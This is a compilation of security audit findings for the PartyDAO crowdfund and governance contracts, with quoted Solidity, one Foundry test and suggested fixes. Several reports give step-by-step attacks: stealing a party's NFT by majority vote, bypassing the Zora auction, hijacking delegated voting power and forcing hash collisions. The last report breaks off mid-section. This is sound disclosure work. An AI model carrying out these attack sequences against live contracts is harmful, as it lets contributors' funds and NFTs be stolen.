# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171   # Vulnerability details       burn() allows for previously recorded delegate to set himself to be contributor's delegate even if another one was already chosen.  This can be quite material as owner choice for the whole voting power is being reset this way to favor the old delegate.  ## Proof of Concept  _burn() can be invoked by anyone on the behalf of any `contributor`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L167-L171  ```solidity     function burn(address payable contributor)         public     {         return _burn(contributor, getCrowdfundLifecycle(), party);     } ```  It mints the governance NFT for the contributor whenever he has voting power:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L471-L485  ```solidity         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         } ```  Now mint() calls _adjustVotingPower() with a new delegate, redirecting all the intristic power, not just one for that id, ignoring the delegation the `owner` might already have:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower;         _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate);         _mint(owner, tokenId);     } ```  I.e. Bob the contributor can take part in the crowdfunding with contribute() with small `0.01 ETH` stake, stating Mike as the delegate of his choice with `contribute(Mike, ...)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L189-L208  ```solidity     /// @param delegate The address to delegate to for the governance phase.     /// @param gateData Data to pass to the gatekeeper to prove eligibility.     function contribute(address delegate, bytes memory gateData)         public         payable     {         _contribute(             msg.sender,             msg.value.safeCastUint256ToUint96(),             delegate,             // We cannot use `address(this).balance - msg.value` as the previous             // total contributions in case someone forces (suicides) ETH into this             // contract. This wouldn't be such a big deal for open crowdfunds             // but private ones (protected by a gatekeeper) could be griefed             // because it would ultimately result in governance power that             // is unattributed/unclaimable, meaning that party will never be             // able to reach 100% consensus.             totalContributions,             gateData         ); ```  Then crowdfund was a success, party was created, and Melany, who also participated, per off-chain arrangement has transferred to Bob a `tokenId` with big voting power (say it is `100 ETH` and the majority of voting power):  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L146-L155  ```solidity     /// @inheritdoc ERC721     function safeTransferFrom(address owner, address to, uint256 tokenId)         public         override         onlyDelegateCall     {         // Transfer voting along with token.         _transferVotingPower(owner, to, votingPowerByTokenId[tokenId]);         super.safeTransferFrom(owner, to, tokenId);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L879-L887  ```solidity     // Transfers some voting power of `from` to `to`. The total voting power of     // their respective delegates will be updated as well.     function _transferVotingPower(address from, address to, uint256 power)         internal     {         int192 powerI192 = power.safeCastUint256ToInt192();         _adjustVotingPower(from, -powerI192, address(0));         _adjustVotingPower(to, powerI192, address(0));     } ```  Bob don't care about his early small contribution and focuses on managing the one that Melany transferred instead as he simply don't need the voting power from the initial `0.01 ETH` contribution anymore.  The actual delegate for Bob at the moment is Linda, while his business with Mike is over. So Bob sets her address there, calling `delegateVotingPower(Linda)`:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L448-L454  ```solidity     /// @notice Pledge your intrinsic voting power to a new delegate, removing it from     ///         the old one (if any).     /// @param delegate The address to delegating voting power to.     function delegateVotingPower(address delegate) external onlyDelegateCall {         _adjustVotingPower(msg.sender, 0, delegate);         emit VotingPowerDelegated(msg.sender, delegate);     } ```  Now, Mike can unilaterally delegate to himself the whole voting power with `burn(Bob)` as mint() just resets the delegation with the previously recorded value with `_adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate)`.  ## Recommended Mitigation Steps  The issue is that mint() always assumes that it is the first operation for the `owner`, which might not always be the case.  Consider not changing the delegate on `mint` if one is set already:  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernanceNFT.sol#L120-L133  ```solidity     function mint(         address owner,         uint256 votingPower,         address delegate     )         external         onlyMinter         onlyDelegateCall     {         uint256 tokenId = ++tokenCount;         votingPowerByTokenId[tokenId] = votingPower; +       address actualDelegate = <get_current_delegate>; +       if (actualDelegate == address(0)) actualDelegate = delegate; -       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), delegate); +       _adjustVotingPower(owner, votingPower.safeCastUint256ToInt192(), actualDelegate);         _mint(owner, tokenId);     } ```  More complicated version might be the one with tracking the most recent request via contribute()/delegateVotingPower() calls timestamps. Here we assume that the delegateVotingPower() holds more information as in the majority of practical cases it occurs after initial contribute() and it is a direct voluntary call from the owner.   
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/indijanc-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/m_Rassska-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Ch_301-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L114-L135   # Vulnerability details  ## Description Voting power is distributed to crowdfund contributors according to the amount contributed divided by NFT purchase price. Attacker can call the buy() function of BuyCrowdfund / CollectionBuyCrowdfund, and use only the first X amount of contribution from the crowdfund, such that attacker's contribution > X/2. He will pass his contract to the buy call, which will receive X and will need to add some additional funds, to purchase the NFT. If the purchase is successful, attacker will have majority rule in the created party. If the party does not do anything malicious, this is a losing move for attacker, because the funds they added on top of X to compensate for the NFT price will eventually be split between group members. However, with majority rule there are various different exploitation vectors attacker may use to steal the NFT from the party ( detailed in separate reports). Because it is accepted that single actor majority is dangerous, but without additional vulnerabilities attacker cannot take ownership of the party's assets, I classify this as a medium. The point is that users were not aware they could become minority under this attack flow.   ## Impact Early contributor can always become majority of crowdfund leading to rugging risks.  ## Proof of Concept 1. Victim A opens BuyCrowdfund and deposits 20 ETH 2. Attacker deposits 30 ETH 3. Victim B deposits 50 ETH 4. Suppose NFT costs 100 ETH 5. Attacker will call buy(), requesting 59ETH buy price. His contract will add 41 additional ETH and buy the NFT. 6. Voting power distributed will be: 20 / 59 for Victim A, 30 / 59 for Attacker, 9 / 59 for Victim B. Attacker has majority. 7. User can use some majority attack to take control of the NFT, netting 100 (NFT value) - 41 (external contribution) - 30 (own contribution) = 29 ETH    ## Tools Used Manual audit.  ## Recommended Mitigation Steps Add a Crowdfund property called minimumPrice, which will be visible to all. Buy() function should not accept NFT price < minimumPrice. Users now have assurances that are not susceptible to majority rule if they deposited enough ETH below the minimumPrice.  
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L116 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/FractionalizeProposal.sol#L54-L62   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. Majority cannot exfiltrate the ETH gained from selling precious NFT via any proposal, and it's impossible to sell NFT for any asset except ETH. If the party were to be compensated via an ERC20 token, majority could pass an ArbitraryCallsProposal to transfer these tokens to an attacker wallet. Unfortunately, FractionalizeProposal is vulnerable to this attack. Attacker/s could pass two proposals and wait for them to be ready for execution. Firstly, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault. Secondly, an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. At this point, attacker can call vault.redeem() to burn the outstanding token supply and receive the NFT back.  ## Impact A 51% majority could steal the precious NFT from the party and leave it empty.  ## Proof of Concept The only non-trivial component of this attack is that the created vault, whose tokens we wish to transfer out, has an undetermined address until VAULT_FACTORY.mint() is called, which creates it. The opcode which creates the vault contract is CREATE, which calculates the address with ```keccak256(VAULT_FACTORY, nonce)```. Nonce will keep changing while new, unrelated NFTs are fractionalized. The attack needs to prepare both FractionalizedProposal and ArbitraryCallsProposal ahead of time, so that they could be chained immediately, meaning there would be no time for other members to call distribute() on the party, which would store the fractionalized tokens safely in the distributor. In order to solve this chicken and the egg problem, we will use a technique taken from traditional low-level exploitation called heap feng shui.   Firstly, calculate off-chain, the rate new NFTs are fractionalized, and multiple by a safety factor (like 1.2X), and multiply again by the proposal execution delay. This number, added to the current VAULT_FACTORY nonce, will be our target_nonce. Calculate ```target_vault = keccak256(VAULT_FACTORY, target_nonce)```, ```before_target_vault = keccak256(VAULT_FACTORY, target_nonce-1)```  Firstly, we will create a contract which has an attack function that: 1. Loop while before_target_vault != created_vault:  • Mint new dummy attacker_NFT  • created_vault = VAULT_FACTORY.mint(attacker_NFT…) 2. Call execute() on the FractionalizedProposal  // We will feed the execute() parameters to the contract in a separate contract setter. Note that this is guaranteed to create target_vault on the correct address. 3. Call execute() on the ArbitraryCallsProposal  Then, we propose the two proposals: 1. Propose a FractionalizedProposal, with any list price and the precious NFT as parameter 2. Propose an ArbitraryCallsProposal, with target = target_vault, data = transfer(ATTACKER, totalVotingPower)  Then, we set the execute() parameters passed in step 2 and 3 of the attack contract using the proposalID allocated for them.   Then, we wait for execution delay to finish.  Finally, run the attack() function prepared earlier. This will increment the VAULT_FACTORY nonce until it is the one we count on during the ArbitraryCallsProposal. Pass enough gas to be able to burn enough nonces.  At this point, attacker has all the vault tokens, so he may call vault.redeem() and receive the precious NFT.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps 1. Enforce a minimum cooldown between proposals. This will mitigate additional weaknesses of the proposal structure. Here, this will give users the opportunity to call distribute() to put the vault tokens safe in distributor. 2. A specific fix here would be to call distribute() at the end of FractionalizeProposal so that there is no window to steal the funds.  
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/CertoraInc-G.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ListOnZoraProposal.sol#L176-L183   # Vulnerability details  ## Description The PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. One of the main protections is that before listing the NFT on Opensea for a proposal-supplied price, it must first try to be auctioned off on Zora. To move from Zora stage to Opensea stage, _settleZoraAuction() is called when executing ListedOnZora step in ListOnOpenseaProposal.sol. If the function returns false, the next step is executed which lists the item on Opensea. It is assumed that if majority attack proposal reaches this stage, it can steal the NFT for free, because it can list the item for negligible price and immediately purchase it from a contract that executes the Opensea proposal.   Indeed, attacker can always make settleZoraAuction() return false. Looking at  the code: ``` try ZORA.endAuction(auctionId) {             // Check whether auction cancelled due to a failed transfer during             // settlement by seeing if we now possess the NFT.             if (token.safeOwnerOf(tokenId) == address(this)) {                 emit ZoraAuctionFailed(auctionId);                 return false;             }         } catch (bytes memory errData) { ``` As the comment already hints, an auction can be cancelled if the NFT transfer to the bidder fails. This is the relevant AuctionHouse code (endAuction): ``` {             // transfer the token to the winner and pay out the participants below             try IERC721(auctions[auctionId].tokenContract).safeTransferFrom(address(this), auctions[auctionId].bidder, auctions[auctionId].tokenId) {} catch {                 _handleOutgoingBid(auctions[auctionId].bidder, auctions[auctionId].amount, auctions[auctionId].auctionCurrency);                 _cancelAuction(auctionId);                 return;  } ``` As most NFTs inherit from OpenZeppelin's ERC721.sol code, safeTransferFrom will run: ```     function _safeTransfer(         address from,         address to,         uint256 tokenId,         bytes memory data     ) internal virtual {         _transfer(from, to, tokenId);         require(_checkOnERC721Received(from, to, tokenId, data), "ERC721: transfer to non ERC721Receiver implementer");     } ``` So, attacker can bid a very high amount on the NFT to ensure it is the winning bid. When AuctionHouse tries to send the NFT to attacker, the safeTransferFrom will fail because attack will not implement an ERC721Receiver. This will force the AuctionHouse to return the bid amount to the bidder and cancel the auction. Importantly, it will lead to a graceful return from endAuction(), which will make settleZoraAuction() return false and progress to the OpenSea stage.  ## Impact A majority attack can easily bypass Zora auction stage and steal the NFT from the party.  ## Proof of Concept 1. Pass a ListOnOpenseaProposal with a tiny list price and execute it 2. Create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. Call its bid() function 3. Wait for the auction to end ( timeout after the bid() call) 4. Create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. Call the attack function.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps _settleZoraAuction is called from both ListOnZoraProposal and ListOnOpenseaProposal. If the auction was cancelled due to a failed transfer, as is described in the comment, we would like to handle it differently for each proposal type. For ListOnZoraProposal, it should indeed return false, in order to finish executing the proposal and not to hang the engine. For ListOnOpenseaProposal, the desired behavior is to *revert* in the case of a failed transfer. This is because the next stage is risky and defense against the mentioned attack is required. Therefore, pass a revertOnFail flag to _settleZoraAuction, which will be used like so: ``` // Check whether auction cancelled due to a failed transfer during // settlement by seeing if we now possess the NFT. if (token.safeOwnerOf(tokenId) == address(this)) {  if (revertOnFail) {   revert("Zora auction failed because of transfer to bidder")  }            emit ZoraAuctionFailed(auctionId);            return false; } ```   
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/delfin454000-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L275 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L325 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L26   # Vulnerability details    At 2 places in the code only part of the output of `keccak256()` is used as the hash: * At `TokenDistributor` - `DistributionState.distributionHash15` - uses only a 15 bytes as a hash     * This one is intended to save storage * At `Crowdfund.governanceOptsHash` a 16 bytes is used as hash     * This one has no benefit at all as it doesn't save on storage   15/16 bytes hash is already not very high to begin with (as explained below). On top of that, using a non standard hash can be unsafe. Since diverging from the standard can break things.    ## Impact   For the `FixedGovernanceOpts` an attacker can create a legitimate party, and then when running `buy()` use the malicious hash to: * include himself in the hosts (DoS-ing the party by vetoing every vote) * reduce the `passThresholdBps` (allowing him to pass any vote, including sending funds from the Party) * Setting himself as `feeRecipient` and increasing the fee   For the `DistributionInfo` struct - an attacker can easily drain all funds from the token distribution contract, by using the legitimate hash to create a distribution with a malicious ERC20 token (and a malicious party contract), and then using the malicious hash to claim assets of a legitimate token.  ## Proof of Concept  ### The attack   Using the birthday attack, for a 50% chance with a 15 bytes hash, the number of hashes needed to generate is 1.4e18 (`(ln(1/0.5) *2) ** 0.5 * (2 ** 60)`). * For 16 bytes that would be 2.2e19  An attacker can create 2 different structs, a legitimate and a malicious one, while modifying at each iteration only the last bits * For the `FixedGovernanceOpts` the last bits would be the `feeRecipient` field * For the `DistributionInfo` struct that would be the `fee` field (and then exploit it via the `claim()` function which doesn't validate the `fee` field)  The attacker will than generate half of the hashes from the malicious one, and half from the legitimate ones, so in case of a collision there's a 50% chance it'd be between the legitimate and malicious struct.    ### CPU  * In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash) * A computer needs about 11 cycles per byte * An avg home PC can do ~3e9 cycles per seconds * There are ~8.6e4 seconds a day * Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = ~1.3e8  * Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)  ### Storage 32 * 1.4e18 = ~4.5e19 bytes is needed, while an affordable drive can be 8TB=~8e12 bytes. That puts it about 5e6 times away from and affordable attack.   ### Overall Risk The calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day) Combining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be ~1e4 (for a medium size attacker; ~1.5e5 for 16 bytes) away from a practical attack.    ## Recommended Mitigation Steps Use the standard, 32-bytes, output of `keccak256()`
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L166-L167   # Vulnerability details  ## Description AuctionCrowdfund's bid() allows any user to compete on an auction on the party's behalf. The code in bid()  forbids placing a bid if party is already winning the auction: ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         } ``` However, it does not account for attackers placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used in two ways: 1. Attacker which lists an NFT, can force the party to spend all its funds up to maxBid on the auction, even if the party could have purchased the NFT for much less. 2. Attackers can grief random auctions, making them pay the absolute maximum for the item. Attackers can use this to drive the prices of NFT items up, profiting from this using secondary markets.  ## Impact Parties can be stopped from buying items at a good value without any risk to the attacker.  ## Proof of Concept 1. Attacker places an NFT for sale, valued at X 2. Attacker creates an AuctionCrowdfund, with maxBid = Y such that Y = 2X 3. Current bid for the NFT is X - AUCTION_STEP 3. Users contribute to the fund, which now has 1.5X 4. Users call bid() to bid X  for the NFT 5. Attacker bids for the item externally for 1.5X - AUCTION_STEP 6. Attacker calls bid() to bid 1.5X for the NFT 7. Attacker sells his NFT for 1.5X although no one apart from the party was interested in buying it above price X  ## Tools Used Manual audit.  ## Recommended Mitigation Steps Introduce a new option variable to AuctionCrowdfunds called speedBump. Inside the bid() function, calculate seconds since last bid, multiplied by the price change factor. This product must be smaller than the chosen speedBump. Using this scheme, the protocol would have resistance to sudden bid spikes. Optionally, allow a majority funder to override the speed bump.  
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388   # Vulnerability details  ## Impact The following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 ```solidity     function transferEth(address payable receiver, uint256 amount)         internal     {         (bool s, bytes memory r) = receiver.call{value: amount}("");         if (!s) {             revert EthTransferFailed(receiver, r);         }     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 ```solidity     function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)         private     {         // If the CF has won, a party must have been created prior.         if (lc == CrowdfundLifecycle.Won) {             if (party_ == Party(payable(0))) {                 revert NoPartyError();             }         } else if (lc != CrowdfundLifecycle.Lost) {             // Otherwise it must have lost.             revert WrongLifecycleError(lc);         }         // Split recipient can burn even if they don't have a token.         if (contributor == splitRecipient) {             if (_splitRecipientHasBurned) {                 revert SplitRecipientAlreadyBurnedError();             }             _splitRecipientHasBurned = true;         }         // Revert if already burned or does not exist.         if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {             CrowdfundNFT._burn(contributor);         }         // Compute the contributions used and owed to the contributor, along         // with the voting power they'll have in the governance stage.         (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =             _getFinalContribution(contributor);         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         }         // Refund any ETH owed back to the contributor.         contributor.transferEth(ethOwed);         emit Burned(contributor, ethUsed, ethOwed, votingPower);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388 ```solidity     function _transfer(         TokenType tokenType,         address token,         address payable recipient,         uint256 amount     )         private     {         bytes32 balanceId = _getBalanceId(tokenType, token);         // Reduce stored token balance.         _storedBalances[balanceId] -= amount;         if (tokenType == TokenType.Native) {             recipient.transferEth(amount);         } else {             assert(tokenType == TokenType.Erc20);             IERC20(token).compatTransfer(recipient, amount);         }     } ```  ## Proof of Concept Please add the following `error` and append the test in `sol-tests\crowdfund\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     error EthTransferFailed(address receiver, bytes errData);      function testContributorContractFailsToReceiveETH() public {         uint256 tokenId = erc721Vault.mint();         BuyCrowdfund pb = _createCrowdfund(tokenId, 0);          // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.         address payable contributorContract = payable(address(this));         vm.deal(contributorContract, 1e18);          address delegate = _randomAddress();          // contributorContract contributes 1e18.         vm.prank(contributorContract);         pb.contribute{ value: 1e18 }(delegate, "");          // The price of the NFT of interest is 0.5e18.         Party party_ = pb.buy(             payable(address(erc721Vault)),             0.5e18,             abi.encodeCall(erc721Vault.claim, (tokenId)),             defaultGovernanceOpts         );          // After calling the buy function, the party is created with the NFT.         assertEq(address(party), address(party_));         assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);         assertEq(pb.settledPrice(), 0.5e18);         assertEq(pb.totalContributions(), 1e18);         assertEq(address(pb).balance, 1e18 - 0.5e18);          // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function         vm.expectRevert(abi.encodeWithSelector(             EthTransferFailed.selector,             contributorContract,             ""         ));         pb.burn(contributorContract);          // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.         assertEq(contributorContract.balance, 0);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/0x1f8b-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L122   # Vulnerability details  ## Impact  BuyCrowdfundBase.sol _buy() When callValue = 0 is settledPrice to totalContributions ignoring whether totalContributions > maximumPrice resulting in the minimum proportion of participants expected to become smaller  ## Proof of Concept ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;  //**** not check totalContributions>maximumPrice****//             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }             settledPrice = settledPrice_;     ```  (AuctionCrowdfund.sol finalize()  similar)  ## Recommended Mitigation Steps add check  ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }  +++         if (maximumPrice_ != 0 && settledPrice_ > maximumPrice_) { +++                settledPrice_ = maximumPrice_; +++         }              settledPrice = settledPrice_;     ``` 
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L236   # Vulnerability details  ## Impact Consider a scenario where few users contributed in auction but noone has placed any bid due to reason like NFT price crash etc. So there was 0 bid, nft owner could seize the crowdfund users fund until they pay a ransom amount as shown below.  ## Proof of Concept 1. NFT N auction is going on 2. CrowdFund users have contributed 100 amount for this auction 3. Bidding has not been done yet 4. A news came for this NFT owner which leads to crashing of this NFT price 5. CrowdFund users are happy that they have not bided and are just waiting for auction to complete so that they can get there refund 6. NFT owner realizing this blackmails the CrowdFund users to send him amount 50 or else he would send this worthless NFT to the Crowdfund Auction contract basically stucking all crowdfund users fund. CrowdFund users ignore this and simply wait for auction to end 7. Once auction completes [finalize function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L196) is called  ``` function finalize(FixedGovernanceOpts memory governanceOpts)         external         onlyDelegateCall         returns (Party party_)     { ...  if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions;                 if (lastBid_ == 0) {                     // Nobody ever contributed. The NFT is effectively burned.                     revert NoContributionsError();                 }                 lastBid = lastBid_;             }             // Create a governance party around the NFT.             party_ = _createParty(                 _getPartyFactory(),                 governanceOpts,                 nftContract,                 nftTokenId             );             emit Won(lastBid_, party_);         }  ... } ```  8. Before calling finalize the lastBid was 0 since no one has bid on this auction but lets see what happens on calling finalize  9. Since NFT owner has transferred NFT to this contract so below statement holds true and lastBid_ is also 0 since no one has bided  ``` if (lastBid_ == 0) {                 lastBid_ = totalContributions; ```  10. This means now lastBid_ is changed to totalContributions which is 100 so crowdfund users funds will not be refunded and they will end up with non needed NFT.   ## Recommended Mitigation Steps Remove the line lastBid_ = totalContributions; and let it be the last bid amount which crowdfund users actually bided with.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfund.sol#L98-L116   # Vulnerability details  ## Impact  Party is DOS'd and may potentially lose access to NFT  ## Proof of Concept  [Crowdfund.sol#L280-L298](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L280-L298)      party = party_ = partyFactory         .createParty(             address(this),             Party.PartyOptions({                 name: name,                 symbol: symbol,                 governance: PartyGovernance.GovernanceOpts({                     hosts: governanceOpts.hosts,                     voteDuration: governanceOpts.voteDuration,                     executionDelay: governanceOpts.executionDelay,                     passThresholdBps: governanceOpts.passThresholdBps,                     totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),                     feeBps: governanceOpts.feeBps,                     feeRecipient: governanceOpts.feeRecipient                 })             }),             preciousTokens,             preciousTokenIds         );  [BuyCrowdfundBase.sol#L166-L173](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L166-L173)      function _getFinalPrice()         internal         override         view         returns (uint256)     {         return settledPrice;     }  When BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to _getFinalPrice which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. totalVotingPower is used by the governance contract to determine the number of votes needed for a proposal to pass. If there are not enough claimable votes to meet that threshold then the party is softlocked because it can't pass any proposals. An attacker could exploit this to DOS even a private party with the following steps:  1. Wait for party to be filled to just under quorum threshold 2. Donate ETH to the crowdfund contract 3. Call BuyCrowdFund.sol#buy. Since it is unpermissioned even for parties with a gatekeeper, the call won't revert  Since the voting power for the final amount of ETH cannot be claimed, the party is now softlocked. If emergencyExecuteDisabled is true then the party will be permanantly locked and the NFT would effectively be burned. If emergencyExecuteDisabled is false then users would have to wait for PartyDAO to reclaim the NFT.  ## Tools Used  ## Recommended Mitigation Steps  Permission to call BuyCrowdFund.sol#buy should be gated if there is a gatekeeper
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Jeiwan-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L72   # Vulnerability details  ## Impact The ArbitraryCallsProposal contract requires sender to provide eth(msg.value) for each call. Now if user has provided more eth than combined call.value then this excess eth is not refunded back to user  ## Proof of Concept  1. Observe the [_executeArbitraryCalls function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L37)  ``` function _executeArbitraryCalls(         IProposalExecutionEngine.ExecuteProposalParams memory params     )         internal         returns (bytes memory nextProgressData)     {  ... uint256 ethAvailable = msg.value;         for (uint256 i = 0; i < calls.length; ++i) {             // Execute an arbitrary call.             _executeSingleArbitraryCall(                 i,                 calls[i],                 params.preciousTokens,                 params.preciousTokenIds,                 isUnanimous,                 ethAvailable             );             // Update the amount of ETH available for the subsequent calls.             ethAvailable -= calls[i].value;             emit ArbitraryCallExecuted(params.proposalId, i, calls.length);         } .... } ```  2. As we can see user provided msg.value is deducted with each calls[i].value 3. Assume user provided 5 amount as msg.value and made a single call with calls[0].value as 4 4. This means after calls have been completed ethAvailable will become 5-4=1 5. Ideally this 1 eth should be refunded back to user but there is no provision for same and the fund will remain in contract   ## 